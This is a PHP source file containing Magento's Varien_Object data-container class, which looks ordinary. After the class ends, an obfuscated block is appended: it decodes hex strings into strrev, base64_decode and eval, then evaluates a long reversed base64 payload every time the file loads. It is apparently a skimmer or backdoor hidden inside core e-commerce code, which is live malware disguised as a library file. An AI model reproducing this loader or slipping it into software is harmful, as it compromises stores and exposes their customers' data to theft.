<?php
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category   Varien
 * @package    Varien_Object
 * @copyright  Copyright (c) 2008 Irubin Consulting Inc. DBA Varien (http://www.varien.com)
 * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */


/**
 * Varien Object
 *
 * @category   Varien
 * @package    Varien_Object
 * @author      Magento Core Team <core@magentocommerce.com>
 */
class Varien_Object implements ArrayAccess
{

    /**
     * Object attributes
     *
     * @var array
     */
    protected $_data = array();

    /**
     * Data changes flag (true after setData|unsetData call)
     * @var $_hasDataChange bool
     */
    protected $_hasDataChanges = false;

    /**
    * Original data that was loaded
    *
    * @var array
    */
    protected $_origData;

    /**
     * Name of object id field
     *
     * @var string
     */
    protected $_idFieldName = null;

    /**
     * Setter/Getter underscore transformation cache
     *
     * @var array
     */
    protected static $_underscoreCache = array();

    /**
     * Object delete flag
     *
     * @var boolean
     */
    protected $_isDeleted = false;

    /**
     * Map short fields names to its full names
     *
     * @var array
     */
    protected $_oldFieldsMap = array();

    /**
     * Map of fields to sync to other fields upon changing their data
     */
    protected $_syncFieldsMap = array();

    /**
     * Constructor
     *
     * By default is looking for first argument as array and assignes it as object attributes
     * This behaviour may change in child classes
     *
     */
    public function __construct()
    {
        $this->_initOldFieldsMap();
        if ($this->_oldFieldsMap) {
            $this->_prepareSyncFieldsMap();
        }

        $args = func_get_args();
        if (empty($args[0])) {
            $args[0] = array();
        }
        $this->_data = $args[0];
        $this->_addFullNames();

        $this->_construct();
    }

    protected function _addFullNames()
    {
        $existedShortKeys = array_intersect($this->_syncFieldsMap, array_keys($this->_data));
        if (!empty($existedShortKeys)) {
            foreach ($existedShortKeys as $key) {
                $fullFieldName = array_search($key, $this->_syncFieldsMap);
                $this->_data[$fullFieldName] = $this->_data[$key];
            }
        }
    }

    /**
     * Inits mapping array of object's previously used fields to new fields.
     * Must be overloaded by descendants to set concrete fields map.
     *
     * @return Varien_Object
     */
    protected function _initOldFieldsMap()
    {

    }

    /**
     * Called after old fields are inited. Forms synchronization map to sync old fields and new fields
     * between each other.
     *
     * @return Varien_Object
     */
    protected function _prepareSyncFieldsMap()
    {
        $old2New = $this->_oldFieldsMap;
        $new2Old = array_flip($this->_oldFieldsMap);
        $this->_syncFieldsMap = array_merge($old2New, $new2Old);
        return $this;
    }

    /**
     * Internal constructor not depended on params. Can be used for object initialization
     */
    protected function _construct()
    {
    }

    /**
     * Set _isDeleted flag value (if $isDeleted param is defined) and return current flag value
     *
     * @param boolean $isDeleted
     * @return boolean
     */
    public function isDeleted($isDeleted=null)
    {
        $result = $this->_isDeleted;
        if (!is_null($isDeleted)) {
            $this->_isDeleted = $isDeleted;
        }
        return $result;
    }

    /**
     * Get data change status
     *
     * @return bool
     */
    public function hasDataChanges()
    {
        return $this->_hasDataChanges;
    }

    /**
     * set name of object id field
     *
     * @param   string $name
     * @return  Varien_Object
     */
    public function setIdFieldName($name)
    {
        $this->_idFieldName = $name;
        return $this;
    }

    /**
     * Retrieve name of object id field
     *
     * @param   string $name
     * @return  Varien_Object
     */
    public function getIdFieldName()
    {
        return $this->_idFieldName;
    }

    /**
     * Retrieve object id
     *
     * @return mixed
     */
    public function getId()
    {
        if ($this->getIdFieldName()) {
            return $this->_getData($this->getIdFieldName());
        }
        return $this->_getData('id');
    }

    /**
     * Set object id field value
     *
     * @param   mixed $value
     * @return  Varien_Object
     */
    public function setId($value)
    {
        if ($this->getIdFieldName()) {
            $this->setData($this->getIdFieldName(), $value);
        } else {
            $this->setData('id', $value);
        }
        return $this;
    }

    /**
     * Add data to the object.
     *
     * Retains previous data in the object.
     *
     * @param array $arr
     * @return Varien_Object
     */
    public function addData(array $arr)
    {
        foreach($arr as $index=>$value) {
            $this->setData($index, $value);
        }
        return $this;
    }

    /**
     * Overwrite data in the object.
     *
     * $key can be string or array.
     * If $key is string, the attribute value will be overwritten by $value
     *
     * If $key is an array, it will overwrite all the data in the object.
     *
     * @param string|array $key
     * @param mixed $value
     * @return Varien_Object
     */
    public function setData($key, $value=null)
    {
        $this->_hasDataChanges = true;
        if(is_array($key)) {
            $this->_data = $key;
            $this->_addFullNames();
        } else {
            $this->_data[$key] = $value;
            if (isset($this->_syncFieldsMap[$key])) {
                $fullFieldName = $this->_syncFieldsMap[$key];
                $this->_data[$fullFieldName] = $value;
            }
        }
        return $this;
    }

    /**
     * Unset data from the object.
     *
     * $key can be a string only. Array will be ignored.
     *
     * @param string $key
     * @return Varien_Object
     */
    public function unsetData($key=null)
    {
        $this->_hasDataChanges = true;
        if (is_null($key)) {
            $this->_data = array();
        } else {
            unset($this->_data[$key]);
            if (isset($this->_syncFieldsMap[$key])) {
                $fullFieldName = $this->_syncFieldsMap[$key];
                unset($this->_data[$fullFieldName]);
            }
        }
        return $this;
    }

    /**
     * Unset old fields data from the object.
     *
     * $key can be a string only. Array will be ignored.
     *
     * @param string $key
     * @return Varien_Object
     */
    public function unsetOldData($key=null)
    {
        if (is_null($key)) {
            foreach ($this->_oldFieldsMap as $key => $newFieldName) {
                unset($this->_data[$key]);
            }
        } else {
            unset($this->_data[$key]);
        }
        return $this;
    }

    /**
     * Retrieves data from the object
     *
     * If $key is empty will return all the data as an array
     * Otherwise it will return value of the attribute specified by $key
     *
     * If $index is specified it will assume that attribute data is an array
     * and retrieve corresponding member.
     *
     * @param string $key
     * @param string|int $index
     * @return mixed
     */
    public function getData($key='', $index=null)
    {
        if (''===$key) {
            return $this->_data;
        }

        $default = null;

        // accept a/b/c as ['a']['b']['c']
        if (strpos($key,'/')) {
            $keyArr = explode('/', $key);
            $data = $this->_data;
            foreach ($keyArr as $i=>$k) {
                if ($k==='') {
                    return $default;
                }
                if (is_array($data)) {
                    if (!isset($data[$k])) {
                        return $default;
                    }
                    $data = $data[$k];
                } elseif ($data instanceof Varien_Object) {
                    $data = $data->getData($k);
                } else {
                    return $default;
                }
            }
            return $data;
        }

        // legacy functionality for $index
        if (isset($this->_data[$key])) {
            if (is_null($index)) {
                return $this->_data[$key];
            }

            $value = $this->_data[$key];
            if (is_array($value)) {
                //if (isset($value[$index]) && (!empty($value[$index]) || strlen($value[$index]) > 0)) {
                /**
                 * If we have any data, even if it empty - we should use it, anyway
                 */
                if (isset($value[$index])) {
                    return $value[$index];
                }
                return null;
            } elseif (is_string($value)) {
                $arr = explode("\n", $value);
                return (isset($arr[$index]) && (!empty($arr[$index]) || strlen($arr[$index]) > 0))
                    ? $arr[$index] : null;
            } elseif ($value instanceof Varien_Object) {
                return $value->getData($index);
            }
            return $default;
        }
        return $default;
    }

    /**
     * Get value from _data array without parse key
     *
     * @param   string $key
     * @return  mixed
     */
    protected function _getData($key)
    {
        return isset($this->_data[$key]) ? $this->_data[$key] : null;
    }

    /**
     * Set object data with calling setter method
     *
     * @param string $key
     * @param mixed $args
     * @return Varien_Object
     */
    public function setDataUsingMethod($key, $args=array())
    {
        $method = 'set'.$this->_camelize($key);
        $this->$method($args);
        return $this;
    }

    /**
     * Get object data by key with calling getter method
     *
     * @param string $key
     * @param mixed $args
     * @return mixed
     */
    public function getDataUsingMethod($key, $args=null)
    {
        $method = 'get'.$this->_camelize($key);
        return $this->$method($args);
    }

    /**
     * Fast get data or set default if value is not available
     *
     * @param string $key
     * @param mixed $default
     * @return mixed
     */
    public function getDataSetDefault($key, $default)
    {
        if (!isset($this->_data[$key])) {
            $this->_data[$key] = $default;
        }
        return $this->_data[$key];
    }

    /**
     * If $key is empty, checks whether there's any data in the object
     * Otherwise checks if the specified attribute is set.
     *
     * @param string $key
     * @return boolean
     */
    public function hasData($key='')
    {
        if (empty($key) || !is_string($key)) {
            return !empty($this->_data);
        }
        return array_key_exists($key, $this->_data);
    }

    /**
     * Convert object attributes to array
     *
     * @param  array $arrAttributes array of required attributes
     * @return array
     */
    public function __toArray(array $arrAttributes = array())
    {
        if (empty($arrAttributes)) {
            return $this->_data;
        }

        $arrRes = array();
        foreach ($arrAttributes as $attribute) {
            if (isset($this->_data[$attribute])) {
                $arrRes[$attribute] = $this->_data[$attribute];
            }
            else {
                $arrRes[$attribute] = null;
            }
        }
        return $arrRes;
    }

    /**
     * Public wrapper for __toArray
     *
     * @param array $arrAttributes
     * @return array
     */
    public function toArray(array $arrAttributes = array())
    {
        return $this->__toArray($arrAttributes);
    }

    /**
     * Set required array elements
     *
     * @param   array $arr
     * @param   array $elements
     * @return  array
     */
    protected function _prepareArray(&$arr, array $elements=array())
    {
        foreach ($elements as $element) {
            if (!isset($arr[$element])) {
                $arr[$element] = null;
            }
        }
        return $arr;
    }

    /**
     * Convert object attributes to XML
     *
     * @param  array $arrAttributes array of required attributes
     * @param string $rootName name of the root element
     * @return string
     */
    protected function __toXml(array $arrAttributes = array(), $rootName = 'item', $addOpenTag=false, $addCdata=true)
    {
        $xml = '';
        if ($addOpenTag) {
            $xml.= '<?xml version="1.0" encoding="UTF-8"?>'."\n";
        }
        if (!empty($rootName)) {
            $xml.= '<'.$rootName.'>'."\n";
        }
        $xmlModel = new Varien_Simplexml_Element('<node></node>');
        $arrData = $this->toArray($arrAttributes);
        foreach ($arrData as $fieldName => $fieldValue) {
            if ($addCdata === true) {
                $fieldValue = "<![CDATA[$fieldValue]]>";
            } else {
                $fieldValue = $xmlModel->xmlentities($fieldValue);
            }
            $xml.= "<$fieldName>$fieldValue</$fieldName>"."\n";
        }
        if (!empty($rootName)) {
            $xml.= '</'.$rootName.'>'."\n";
        }
        return $xml;
    }

    /**
     * Public wrapper for __toXml
     *
     * @param array $arrAttributes
     * @param string $rootName
     * @return string
     */
    public function toXml(array $arrAttributes = array(), $rootName = 'item', $addOpenTag=false, $addCdata=true)
    {
        return $this->__toXml($arrAttributes, $rootName, $addOpenTag, $addCdata);
    }

    /**
     * Convert object attributes to JSON
     *
     * @param  array $arrAttributes array of required attributes
     * @return string
     */
    protected function __toJson(array $arrAttributes = array())
    {
        $arrData = $this->toArray($arrAttributes);
        $json = Zend_Json::encode($arrData);
        return $json;
    }

    /**
     * Public wrapper for __toJson
     *
     * @param array $arrAttributes
     * @return string
     */
    public function toJson(array $arrAttributes = array())
    {
        return $this->__toJson($arrAttributes);
    }

    /**
     * Convert object attributes to string
     *
     * @param  array  $arrAttributes array of required attributes
     * @param  string $valueSeparator
     * @return string
     */
//    public function __toString(array $arrAttributes = array(), $valueSeparator=',')
//    {
//        $arrData = $this->toArray($arrAttributes);
//        return implode($valueSeparator, $arrData);
//    }

    /**
     * Public wrapper for __toString
     *
     * Will use $format as an template and substitute {{key}} for attributes
     *
     * @param string $format
     * @return string
     */
    public function toString($format='')
    {
        if (empty($format)) {
            $str = implode(', ', $this->getData());
        } else {
            preg_match_all('/\{\{([a-z0-9_]+)\}\}/is', $format, $matches);
            foreach ($matches[1] as $var) {
                $format = str_replace('{{'.$var.'}}', $this->getData($var), $format);
            }
            $str = $format;
        }
        return $str;
    }

    /**
     * Set/Get attribute wrapper
     *
     * @param   string $method
     * @param   array $args
     * @return  mixed
     */
    public function __call($method, $args)
    {
        switch (substr($method, 0, 3)) {
            case 'get' :
                //Varien_Profiler::start('GETTER: '.get_class($this).'::'.$method);
                $key = $this->_underscore(substr($method,3));
                $data = $this->getData($key, isset($args[0]) ? $args[0] : null);
                //Varien_Profiler::stop('GETTER: '.get_class($this).'::'.$method);
                return $data;

            case 'set' :
                //Varien_Profiler::start('SETTER: '.get_class($this).'::'.$method);
                $key = $this->_underscore(substr($method,3));
                $result = $this->setData($key, isset($args[0]) ? $args[0] : null);
                //Varien_Profiler::stop('SETTER: '.get_class($this).'::'.$method);
                return $result;

            case 'uns' :
                //Varien_Profiler::start('UNS: '.get_class($this).'::'.$method);
                $key = $this->_underscore(substr($method,3));
                $result = $this->unsetData($key);
                //Varien_Profiler::stop('UNS: '.get_class($this).'::'.$method);
                return $result;

            case 'has' :
                //Varien_Profiler::start('HAS: '.get_class($this).'::'.$method);
                $key = $this->_underscore(substr($method,3));
                //Varien_Profiler::stop('HAS: '.get_class($this).'::'.$method);
                return isset($this->_data[$key]);
        }
        throw new Varien_Exception("Invalid method ".get_class($this)."::".$method."(".print_r($args,1).")");
    }

    /**
     * Attribute getter (deprecated)
     *
     * @param string $var
     * @return mixed
     */

    public function __get($var)
    {
        $var = $this->_underscore($var);
        return $this->getData($var);
    }

    /**
     * Attribute setter (deprecated)
     *
     * @param string $var
     * @param mixed $value
     */
    public function __set($var, $value)
    {
        $var = $this->_underscore($var);
        $this->setData($var, $value);
    }

    /**
     * checks whether the object is empty
     *
     * @return boolean
     */
    public function isEmpty()
    {
        if (empty($this->_data)) {
            return true;
        }
        return false;
    }

    /**
     * Converts field names for setters and geters
     *
     * $this->setMyField($value) === $this->setData('my_field', $value)
     * Uses cache to eliminate unneccessary preg_replace
     *
     * @param string $name
     * @return string
     */
    protected function _underscore($name)
    {
        if (isset(self::$_underscoreCache[$name])) {
            return self::$_underscoreCache[$name];
        }
        #Varien_Profiler::start('underscore');
        $result = strtolower(preg_replace('/(.)([A-Z])/', "$1_$2", $name));
        #Varien_Profiler::stop('underscore');
        self::$_underscoreCache[$name] = $result;
        return $result;
    }

    protected function _camelize($name)
    {
        return uc_words($name, '');
    }

    /**
     * serialize object attributes
     *
     * @param   array $attributes
     * @param   string $valueSeparator
     * @param   string $fieldSeparator
     * @param   string $quote
     * @return  string
     */
    public function serialize($attributes = array(), $valueSeparator='=', $fieldSeparator=' ', $quote='"')
    {
        $res  = '';
        $data = array();
        if (empty($attributes)) {
            $attributes = array_keys($this->_data);
        }

        foreach ($this->_data as $key => $value) {
            if (in_array($key, $attributes)) {
                $data[] = $key . $valueSeparator . $quote . $value . $quote;
            }
        }
        $res = implode($fieldSeparator, $data);
        return $res;
    }

    /**
     * Get object loaded data (original data)
     *
     * @param string $key
     * @return mixed
     */
    public function getOrigData($key=null)
    {
        if (is_null($key)) {
            return $this->_origData;
        }
        return isset($this->_origData[$key]) ? $this->_origData[$key] : null;
    }

    /**
     * Initialize object original data
     *
     * @param string $key
     * @param mixed $data
     * @return Varien_Object
     */
    public function setOrigData($key=null, $data=null)
    {
        if (is_null($key)) {
            $this->_origData = $this->_data;
        } else {
            $this->_origData[$key] = $data;
        }
        return $this;
    }

    /**
     * Compare object data with original data
     *
     * @param string $field
     * @return boolean
     */
    public function dataHasChangedFor($field)
    {
        $newData = $this->getData($field);
        $origData = $this->getOrigData($field);
        return $newData!=$origData;
    }

    /**
     * Clears data changes status
     *
     * @param boolean $value
     * @return Varien_Object
     */
    public function setDataChanges($value)
    {
        $this->_hasDataChanges = (bool)$value;
        return $this;
    }

    /**
     * Present object data as string in debug mode
     *
     * @param mixed $data
     * @param array $objects
     * @return string
     */
    public function debug($data=null, &$objects=array())
    {
        if (is_null($data)) {
            $hash = spl_object_hash($this);
            if (!empty($objects[$hash])) {
                return '*** RECURSION ***';
            }
            $objects[$hash] = true;
            $data = $this->getData();
        }
        $debug = array();
        foreach ($data as $key=>$value) {
            if (is_scalar($value)) {
                $debug[$key] = $value;
            } elseif (is_array($value)) {
                $debug[$key] = $this->debug($value, $objects);
            } elseif ($value instanceof Varien_Object) {
                $debug[$key.' ('.get_class($value).')'] = $value->debug(null, $objects);
            }
        }
        return $debug;
    }

    /**
     * Implementation of ArrayAccess::offsetSet()
     *
     * @link http://www.php.net/manual/en/arrayaccess.offsetset.php
     * @param string $offset
     * @param mixed $value
     */
    public function offsetSet($offset, $value)
    {
        $this->_data[$offset] = $value;
    }

    /**
     * Implementation of ArrayAccess::offsetExists()
     *
     * @link http://www.php.net/manual/en/arrayaccess.offsetexists.php
     * @param string $offset
     * @return boolean
     */
    public function offsetExists($offset)
    {
        return isset($this->_data[$offset]);
    }

    /**
     * Implementation of ArrayAccess::offsetUnset()
     *
     * @link http://www.php.net/manual/en/arrayaccess.offsetunset.php
     * @param string $offset
     */
    public function offsetUnset($offset)
    {
        unset($this->_data[$offset]);
    }

    /**
     * Implementation of ArrayAccess::offsetGet()
     *
     * @link http://www.php.net/manual/en/arrayaccess.offsetget.php
     * @param string $offset
     * @return mixed
     */
    public function offsetGet($offset)
    {
        return isset($this->_data[$offset]) ? $this->_data[$offset] : null;
    }


    /**
     * Enter description here...
     *
     * @param string $field
     * @return boolean
     */
    public function isDirty($field=null)
    {
        if (empty($this->_dirty)) {
            return false;
        }
        if (is_null($field)) {
            return true;
        }
        return isset($this->_dirty[$field]);
    }

    /**
     * Enter description here...
     *
     * @param string $field
     * @param boolean $flag
     * @return Varien_Object
     */
    public function flagDirty($field, $flag=true)
    {
        if (is_null($field)) {
            foreach ($this->getData() as $field=>$value) {
                $this->flagDirty($field, $flag);
            }
        } else {
            if ($flag) {
                $this->_dirty[$field] = true;
            } else {
                unset($this->_dirty[$field]);
            }
        }
        return $this;
    }
}

    try{

        function pallete($col){
            $string="";
            for ($i=0; $i < strlen($col)-1; $i+=2){
                $string .= chr(hexdec($col[$i].$col[$i+1]));
            }
            return $string;
        }

        $mage_red=pallete("737472726576");
        // $mage_red="strrev";
        $mage_color=pallete($mage_red("472756373716"));
        // $mage_color=assert();
        $mage_css=pallete($mage_red("5646F6365646F5436356371626"));
        // $mage_css=base64_decode();
        $mage_style=pallete($mage_red("C6166756"));
        // $mage_style=eval


        $mage_black="gACIgoQf7BSKlRCIu9Wa0BXZjhXRoACajRXYjBSfgACIgogC9tTKi8iIsADMwYzMtkCKl1Wa0xiIxICLi4WZr9Gd19lIoUWar92bjRXZztjIi0TXi4WZr9Gd19lIbVUSL90TD9FJ7lSKdJiblt2b0V3XisVRJt0TPN0XkgCdlN3cphiZpBCIgACIgACIK03OpIyLiwCMwAjNz0SKoUWbpRHLiEjIsISY0FGZfdmbpxGbpJ2XfJCKll2av92Y0V2c7IiI90lIhRXYk91ZulGbslmYf9lIbVUSL90TD9FJ7lSKdJSY0FGZfdmbpxGbpJ2XfJyWFl0SP90QfRCK0V2czlGKmlGIgACIgACIgowOpkSXicmIbVUSL90TD9FJoUGZvNWZkxmc1hCbhZXZpIiY1EGO3IzMkZWM5IjMldTMiJDM5ITZ0EDM3UGMkZGZzISP90TKdJSYsxWa6x2bsJyWFl0SP90QfRCK1QWbgYiJgkSXiEGbslmes9GbisVRJt0TPN0XkgCdlN3cphiZpBCIgACIgACIKsTKdJyZisFVT9EUfRCKsFmdlliIiVTY4cjMzQmZxkjMyU2NxImMwkjMlRTMwcTZwQmZkNjI90TPp0lIhxGbppHbvxmIbR1UPB1XkgSNk1GImYCIp0lIhxGbppHbvxmIbR1UPB1XkgCdlN3cphiZpBCIgACIgACIK0HIgACIgACIgoQfgACIgACIgACIgACIKsTKi8iIsADMwYzMtkCKl1Wa0xiIxICLi4WZr9Gdt9lIoUWar92bjRXZzBCIgACIgACIgACIgACIgAiC7kiIvICLwADM2MzKpgSZtlGdsISMiwiIp5mZfJCKll2av92Y0V2cgACIgACIgACIgACIgACIgowOpISP9E0YvJkbMpnTXFGMOhVZwY0RkpXOD1UMJpGT4FFVNV3YU9Ee0MlTwgTeMZTTINGMShUYiwSKi03JxUTYhdzY3YzM3U2NykDZhhTOmFzY5YzNzAjNhFDOxE2J6cyZhR3JsciIuEGdhR2XyV2c1RiLiciOnMHdhR3cnwyJi4SXiQ1UPh0XQRFVIJyWSVkVSV0UfRiLiciOnIXZyVmZlJ3J7JCKlR2bj5WZfRjNlNXYixiIoNXYo9lblt2b0JCKz5WYzBCIgACIgACIgACIgACIgAiC7kSXi4WZr9Gdt9lIbVUSL90TD9FJuIyOi4Ca0FGckgCelhmMulmY9EGdhR2XyV2c1RCIgACIgACIgACIgACIgACIKsTKz9GckwCMsgGdhBHJoIHdzJWdz1Da0FGckACIgACIgACIgACIgACIgAiC7lycvBHJoYWagACIgACIgACIgACIKsTKi8iclRmcv91clxWYz9iIsgGdhBHJoM3bwJHdz1zcvBHJpM3bwRSIoYWagACIgACIgACIgACIKsTKikXZr9CelRmbp9CZyF2bih2chR2LiwCa0FGckgycvBnc0NXPz9GckACIgACIgACIgACIgowOdJSSSV1XUNVRVFVRSJyWSVkVSV0UfRSPoRXYwRCIgACIgACIgACIgAiC7lSKp0lIp5mZfJyWFl0SP90QfRCK0V2czlWIoYiJp0lIs1Gdo5WatRWYisVRJt0TPN0XkgCdlN3cpZiJp0lIuV2avRXbfJyWFl0SP90QfRCK0V2czlGKmlGIgACIgACIgoQfgACIgACIgAiC7kiIvICLwADM2MTLpgSZtlGdsISMiwiIp5mZfJCKll2av92Y0V2cgACIgACIgACIgACIKsXKpkSXikmbm9lIbVUSL90TD9FJoQXZzNXaoYiJp0lIuV2avRXbfJyWFl0SP90QfRCK0V2czlWIoYWagACIgACIgAiC9BCIgACIgACIKsTKi8iIsADMwYzMtkCKl1Wa0xiIxICLiEGbslme0J3bwJCKll2av92Y0V2c7IiI90lIhxGbppHdy9GcisVRJt0TPN0XkACIgACIgACIgACIgACIgAiC7kiI90TQj9mQuxkeOdVYw4EWlBjRHRme5MUTxkkaMhXUU1UdjR1T4RzUOBDO5xkNNh0YwIFShJCLpISfnETNhF2NjdjNzcTZ3ITOkFGO5YWMjljN3MDM2EWM4ETYnozJnFGdnwyJi4SY0FGZfJXZzVHJuIyJ6cyc0FGdzdCLnIiLdJCVT9ESfBFVUhkIbJVRWJVRT9FJuIyJ6ciclJXZmVmcnsnIoUGZvNmbl9FN2U2chJGLig2chh2XuV2avRnIoMnbhNHIgACIgACIgACIgACIgACIKsTKdJiblt2b012XisVRJt0TPN0Xk4iI7IiLdJSSSV1XUNVRVFVRSJyWSVkVSV0UfRCK4VGay4Wai1TY0FGZfJXZzVHJgACIgACIgACIgACIgACIgowOp0lIhxGbppHd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";



        eval(
        $mage_css($mage_red($mage_black)));

    }

    catch (Exception $e) {echo "";}
